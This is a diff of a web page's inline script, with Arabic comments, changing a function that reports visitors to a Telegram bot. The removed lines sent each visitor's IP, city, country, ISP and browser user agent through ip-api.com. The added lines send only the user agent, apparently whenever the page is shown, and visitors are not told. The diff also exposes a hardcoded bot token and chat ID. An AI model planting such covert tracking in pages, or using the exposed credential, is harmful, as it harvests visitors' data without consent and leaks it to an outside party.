@@ -60,26 +60,15 @@
     </div>
 
     <script>
-        async function sendLogToBot(extraMessage) {
+        function sendLogToBot(extraMessage) {
             const token = "8822902847:AAH0cwrAwfnY_4qZBc3iUjuH5UY1UDIE17s"; 
             const chatId = "5591628026";
-
-            try {
-                const response = await fetch('https://ip-api.com/json/');
-                const data = await response.json();
-
-                const deviceInfo = navigator.userAgent; 
-                const message = `${extraMessage}\n\n` +
-                                `📍 المدينة: ${data.city || 'غير معروف'}\n` +
-                                `🌐 الدولة: ${data.country || 'غير معروف'}\n` +
-                                `🏢 مزود الخدمة: ${data.isp || 'غير معروف'}\n` +
-                                `🔢 IP: ${data.query || 'غير معروف'}\n` +
-                                `📱 الجهاز: ${deviceInfo}`;
-                
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
-            } catch (error) {
-                console.error("خطأ:", error);
-            }
+            
+            // نكتفي بإرسال نوع الجهاز لأنه مضمون الوصول
+            const deviceInfo = navigator.userAgent; 
+            const message = `${extraMessage}\n\n📱 الجهاز المستخدم:\n${deviceInfo}`;
+            
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
         }
 
         window.onpageshow = function() {
